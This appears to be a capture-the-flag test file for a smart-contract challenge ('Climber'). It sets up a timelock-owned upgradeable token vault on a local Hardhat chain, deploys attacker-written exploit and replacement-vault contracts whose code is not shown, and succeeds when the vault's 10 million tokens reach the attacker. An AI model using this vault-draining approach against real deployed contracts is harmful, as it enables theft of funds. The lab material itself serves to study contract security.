const { ethers, upgrades } = require("hardhat")
const { expect } = require("chai")

describe("[Challenge] Climber", function () {
    let deployer, proposer, sweeper, attacker

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther("10000000")

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, proposer, sweeper, attacker] = await ethers.getSigners()

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ])
        expect(await ethers.provider.getBalance(attacker.address)).to.equal(
            ethers.utils.parseEther("0.1")
        )

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory("ClimberVault", deployer),
            [deployer.address, proposer.address, sweeper.address],
            { kind: "uups" }
        )

        expect(await this.vault.getSweeper()).to.eq(sweeper.address)
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt("0")
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero)
        expect(await this.vault.owner()).to.not.eq(deployer.address)

        // Instantiate timelock
        let timelockAddress = await this.vault.owner()
        this.timelock = await (
            await ethers.getContractFactory("ClimberTimelock", deployer)
        ).attach(timelockAddress)

        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy()
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE)
    })

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */
        let vault = this.vault.connect(attacker)
        let timelock = this.timelock.connect(attacker)
        let token = this.token.connect(attacker)

        let vault2 = await (await ethers.getContractFactory("ClimberVault2", attacker)).deploy()

        let exploit = await (
            await ethers.getContractFactory("Exploit", attacker)
        ).deploy(
            timelock.address,
            vault.address,
            attacker.address,
            token.address,
            VAULT_TOKEN_BALANCE,
            vault2.address
        )

        const log = async () => {
            console.log("\t ===================================================")
            console.log("\t deployer address:", deployer.address)
            console.log("\t proposer address:", proposer.address)
            console.log("\t sweeper address:", sweeper.address)
            console.log("\t attacker address:", attacker.address)
            console.log("\t exploit contract address:", exploit.address)
            console.log("\t vault contract address:", vault.address)
            console.log("\t timelock contract address:", timelock.address)
            console.log("\t token contract address:", token.address)
            console.log("\t ===================================================")
        }

        await log()

        console.log("\t Attacking!!!")

        await exploit.exploit()

        await log()
    })

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq("0")
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE)
    })
})
